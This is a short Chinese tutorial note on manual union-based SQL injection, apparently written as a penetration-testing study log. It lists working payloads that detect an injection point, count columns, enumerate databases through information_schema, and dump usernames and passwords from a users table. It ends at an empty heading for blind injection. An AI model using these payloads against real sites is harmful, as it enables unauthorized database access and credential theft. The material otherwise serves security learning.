---
# 这是页面的图标
icon: token
# 这是文章的标题
title: SQL注入
# 设置作者
author: lhz
# 设置写作时间
time: 2021-08-18
# 一个页面只能有一个分类
category: 渗透
# 一个页面可以有多个标签
tag:
  - 渗透
  - SQL注入
comment: false
---
## 普通手动注入
 ### 1. 判断是否存在注入点
```
单引号， and 1=1 ，and 1=2 ，双引号，反斜杠，注释等
```
根据报错信息，返回内容判断是否存在sql注入
### 2. 判断是否存在注入点
逐步提高order by 1列号，出现错误时表示超过表的列数
```
order by 1 --
```
### 3. 判断字段的显示位
观察1，2，3的显示位置判断字段显示位
```
union select 1,2,3 --
```
### 4. 获取当前数据库信息
```
database(): 查看当前数据库名称
version(): 查看数据库版本信息
user(): 返回当前数据库连接使用的用户
可以使用group_concat()函数将多个字段连在一起当作一个字段中显示

' union select 1,group_concat(database(),version()),3 -- '
```
### 5. 获取全部数据库信息
Mysql有一个系统的数据库information_schema,里面保存着所有数据库的相关信息
```
获取数据库表信息：ps：table_schema='数据库名'
' union select 1,group_concat(char(32),table_name,char(32)),3 from information_schema.tables where table_schema='security' -- '

获取表信息的列信息：
' union select 1,group_concat(char(32),column_name,char(32)),3 from information_schema.columns where table_name='users' -- '

获取数据：
' union select 1,group_concat(char(32),username,char(32),password),3 from users -- '
```

## 手动盲注
